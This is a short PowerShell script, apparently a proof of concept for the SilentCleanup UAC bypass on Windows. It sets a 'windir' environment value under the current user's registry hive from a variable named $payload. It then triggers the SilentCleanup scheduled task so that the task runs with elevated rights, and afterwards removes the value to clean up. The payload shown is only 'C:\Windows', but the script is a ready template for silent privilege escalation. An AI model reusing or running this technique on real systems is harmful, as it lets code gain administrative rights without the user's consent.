$key = "HKCU:\Environment"
$payload = 'C:\Windows'
if ($true) {
    New-Item $key -Force |
        New-ItemProperty -Name 'windir' -Value $payload -PropertyType string -Force | Out-Null
}
Start-Process schtasks.exe -ArgumentList '/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I'
Remove-ItemProperty -Path $key -Name windir
